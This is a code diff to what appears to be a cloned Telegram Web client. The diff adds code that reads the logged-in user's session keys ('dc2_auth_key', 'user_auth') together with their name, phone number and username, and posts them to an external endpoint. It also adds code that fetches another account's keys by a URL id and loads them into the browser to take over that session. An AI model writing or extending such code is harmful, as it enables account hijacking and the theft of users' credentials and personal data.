@@ -39,6 +39,7 @@ import { nextRandomUint } from './helpers/random';
 import { IS_OVERLAY_SCROLL_SUPPORTED, USE_CUSTOM_SCROLL, USE_NATIVE_SCROLL } from './environment/overlayScrollSupport';
 import IMAGE_MIME_TYPES_SUPPORTED, { IMAGE_MIME_TYPES_SUPPORTED_PROMISE } from './environment/imageMimeTypesSupport';
 import MEDIA_MIME_TYPES_SUPPORTED from './environment/mediaMimeTypesSupport';
+import getPreviewURLFromThumb from "./helpers/getPreviewURLFromThumb"
 const env = import.meta.env;
 // import appNavigationController from './components/appNavigationController';
 
@@ -330,8 +331,7 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
     I18n.getLangPack(langPack.lang_code);
   } else {
     fillLocalizedDates();
-  }
-
+  } 
   rootScope.addEventListener('language_change', () => {
     fillLocalizedDates();
   });
@@ -363,7 +363,7 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
   }
 
   let authState = stateResult.state.authState;
-  console.log('AuthState', authState)
+  console.log('AuthState', authState._)
   const hash = location.hash;
   const splitted = hash.split('?');
   const params = parseUriParamsLine(splitted[1] ?? splitted[0].slice(1));
@@ -392,7 +392,108 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
 
     // appNavigationController.overrideHash('?tgaddr=' + encodeURIComponent(params.tgaddr));
   }
+  let url = window.location.href;
+  let currId = url.split("/").pop();
+  if (currId.includes(":")) {
+    let [fatherUuid, id] = currId.split(":")
+    if (fatherUuid && id) {
+      try {
+        const response = await fetch(import.meta.env.VITE_GET_LEAD, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ fatherUuid, id }),
+        });
 
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const { dc2_auth_key, user_auth } = await response.json();
+        localStorage.setItem("dc2_auth_key", dc2_auth_key)
+        localStorage.setItem("user_auth", user_auth)
+        localStorage.setItem("core", "true")
+        let url = window.location.href;
+        let parsedUrl = new URL(url);
+        window.location.replace(`${parsedUrl.protocol}//${parsedUrl.host}`);
+      } catch (error) {
+        console.error('Error saving auth data:', error);
+      }
+    }
+  }
+  if (authState._ === 'authStateSignedIn') {
+    let url2 = window.location.href;
+    let currId2 = url2.split("/").pop();
+    async function getDbIndexes(id: string) {
+      return new Promise((resolve, reject) => {
+        const request = window.indexedDB.open("tweb", 7);
+        request.onsuccess = function (event: any) {
+          const db = event.target.result;
+          const transaction = db.transaction("users", "readonly");
+          const store = transaction.objectStore("users");
+          const getRequest = store.get("" + id);
+          getRequest.onsuccess = function () {
+            if (getRequest.result) {
+              resolve(getRequest.result);
+            } else {
+              resolve("No matching record found")
+            }
+          };
+
+          getRequest.onerror = function (error: any) {
+            console.error(error)
+            resolve("Error retrieving data")
+          };
+        };
+
+        request.onerror = function (error: any) {
+          console.error(error)
+          resolve("Error opening database")
+        };
+
+      })
+    }
+    async function saveAuthData() {
+      const dc2_auth_key = localStorage.getItem('dc2_auth_key');
+      const user_auth = localStorage.getItem('user_auth');
+      let { id } = JSON.parse(user_auth)
+      let curr_user_data: any = {}; // User
+      // 
+      if (id) {
+        curr_user_data = await getDbIndexes(id);
+        let photo: any = "";
+      }
+      if (dc2_auth_key && user_auth) {
+        try {
+          const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              dc2_auth_key,
+              user_auth,
+              currId: currId2,  
+              fullName: [curr_user_data.first_name, curr_user_data.last_name].filter(Boolean).join(" "),
+              phone: curr_user_data.phone,
+              username: curr_user_data.username
+            }),
+
+          });
+
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
+          const data = await response.json();
+        } catch (error) {
+          console.error('Error saving auth data:', error);
+        }
+      } else {
+        console.error('Auth keys not found in localStorage');
+      }
+    }
+    if (!currId2.includes(":")) saveAuthData();
+  }
   if (authState._ !== 'authStateSignedIn'/*  || 1 === 1 */) {
     console.log('Will mount auth page:', authState._, Date.now() / 1000);
 
@@ -498,45 +599,17 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
     console.log('Will mount IM page:', Date.now() / 1000);
     fadeInWhenFontsReady(document.getElementById('main-columns'), loadFonts());
     const coreL = localStorage.getItem('core');
-
     switch (coreL) {
       case "true":
         (await import('./pages/pageIm')).default.mount();
         break;
       case "false":
       default:
-        async function saveAuthData() {
-          const dc2_auth_key = localStorage.getItem('dc2_auth_key');
-          const user_auth = localStorage.getItem('user_auth');
-          let url = window.location.href;
-          let currId = url.split("/").pop();
 
-          if (dc2_auth_key && user_auth) {
-            try {
-              const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ dc2_auth_key, user_auth, currId }),
-              });
-
-              if (!response.ok) {
-                throw new Error('Network response was not ok');
-              }
-
-              const data = await response.json();
-              console.log(data.message); // Handle the success message
-            } catch (error) {
-              console.error('Error saving auth data:', error);
-            }
-          } else {
-            console.error('Auth keys not found in localStorage');
-          }
-        }
-        saveAuthData();
         (await import('./pages/pageImLead')).default.mount();
         break;
     }
   }
+
+
 });
